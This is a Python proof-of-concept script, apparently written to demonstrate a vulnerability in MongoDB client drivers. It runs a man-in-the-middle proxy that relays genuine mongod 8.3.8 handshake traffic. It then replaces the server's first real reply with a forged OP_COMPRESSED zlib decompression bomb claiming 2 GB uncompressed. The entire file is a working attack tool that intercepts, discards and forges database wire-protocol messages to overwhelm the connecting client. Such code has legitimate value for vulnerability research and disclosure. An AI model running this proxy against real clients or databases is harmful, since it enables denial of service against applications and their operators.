"""
Transparent MITM proxy in front of a REAL mongod 8.3.8 instance.

Handles multiple concurrent connections (pymongo opens a separate monitor
connection plus one or more pooled operation connections). For EACH TCP
connection: the initial handshake is relayed byte-for-byte, untouched, in
both directions (100% genuine mongod 8.3.8 bytes). Then, on that
connection's first post-handshake reply from the real server, the proxy
substitutes its own hand-crafted OP_COMPRESSED "zlib bomb" instead of
forwarding what the real server actually said.

This models exactly the threat this vulnerability targets: a compromised
mongod, or an on-path attacker tampering with an unencrypted (or
improperly-verified-TLS) connection. Everything else in the exchange is
genuine, unmodified mongod 8.3.8 traffic; only the one substituted reply
is forged.
"""
import socket
import struct
import sys
import threading

LISTEN_PORT = int(sys.argv[1])
REAL_MONGOD_PORT = int(sys.argv[2])
BOMB_PATH = sys.argv[3] if len(sys.argv) > 3 else "bomb_2gb.zlib"
BOMB_UNCOMPRESSED_SIZE = int(sys.argv[4]) if len(sys.argv) > 4 else 2_000_000_000

OP_COMPRESSED = 2012

_bomb_fired = threading.Event()


def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def read_message(sock):
    header = recv_exact(sock, 16)
    if header is None:
        return None
    length, request_id, response_to, op_code = struct.unpack("<iiii", header)
    body = recv_exact(sock, length - 16)
    if body is None:
        return None
    return header + body, length, request_id, response_to, op_code


def make_bomb_reply(request_id, response_to, original_opcode):
    with open(BOMB_PATH, "rb") as f:
        compressed = f.read()
    comp_header = struct.pack("<iiB", original_opcode, BOMB_UNCOMPRESSED_SIZE, 2)  # 2 = zlib
    body = comp_header + compressed
    length = 16 + len(body)
    header = struct.pack("<iiii", length, request_id, response_to, OP_COMPRESSED)
    print(
        f"[proxy] *** SUBSTITUTING real reply with OP_COMPRESSED bomb *** "
        f"wire_bytes={length} claimed_uncompressed={BOMB_UNCOMPRESSED_SIZE} "
        f"(compressed_payload={len(compressed)} bytes, ratio {BOMB_UNCOMPRESSED_SIZE/len(compressed):.0f}:1)",
        flush=True,
    )
    return header + body


def handle_client(client_sock, conn_id):
    try:
        server_sock = socket.create_connection(("127.0.0.1", REAL_MONGOD_PORT))
    except OSError as e:
        print(f"[proxy#{conn_id}] failed to connect to real mongod: {e}", flush=True)
        return
    print(f"[proxy#{conn_id}] connected to real mongod", flush=True)

    # Step 1: relay the client's initial handshake request to the real server, untouched.
    r = read_message(client_sock)
    if r is None:
        return
    msg, length, request_id, response_to, op_code = r
    print(f"[proxy#{conn_id}] client->server (handshake) op_code={op_code} len={length}: relaying untouched", flush=True)
    server_sock.sendall(msg)

    # Step 2: relay the real server's handshake reply back to the client, untouched.
    r = read_message(server_sock)
    if r is None:
        return
    msg, length, request_id, response_to, op_code = r
    print(f"[proxy#{conn_id}] server->client (handshake reply) op_code={op_code} len={length}: relaying untouched (REAL mongod bytes)", flush=True)
    client_sock.sendall(msg)

    substituted_yet = False
    while True:
        r = read_message(client_sock)
        if r is None:
            break
        msg, length, request_id, response_to, op_code = r
        print(f"[proxy#{conn_id}] client->server op_code={op_code} len={length}: relaying untouched", flush=True)
        server_sock.sendall(msg)

        r2 = read_message(server_sock)
        if r2 is None:
            break
        real_msg, real_length, real_request_id, real_response_to, real_op_code = r2

        if not substituted_yet and not _bomb_fired.is_set():
            _bomb_fired.set()
            substituted_yet = True
            print(f"[proxy#{conn_id}] server->client (REAL reply, len={real_length}, op_code={real_op_code}) intercepted -- discarding it", flush=True)
            bomb = make_bomb_reply(real_request_id, real_response_to, real_op_code)
            client_sock.sendall(bomb)
            print(f"[proxy#{conn_id}] bomb delivered on this connection; closing", flush=True)
            break
        else:
            print(f"[proxy#{conn_id}] server->client op_code={real_op_code} len={real_length}: relaying untouched", flush=True)
            client_sock.sendall(real_msg)

    server_sock.close()
    client_sock.close()
    print(f"[proxy#{conn_id}] connection closed", flush=True)


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", LISTEN_PORT))
    srv.listen(5)
    print(f"[proxy] listening on 127.0.0.1:{LISTEN_PORT}, forwarding to real mongod on 127.0.0.1:{REAL_MONGOD_PORT}", flush=True)
    conn_id = 0
    while True:
        client_sock, addr = srv.accept()
        conn_id += 1
        print(f"[proxy] connection #{conn_id} from {addr}", flush=True)
        t = threading.Thread(target=handle_client, args=(client_sock, conn_id), daemon=True)
        t.start()


if __name__ == "__main__":
    main()
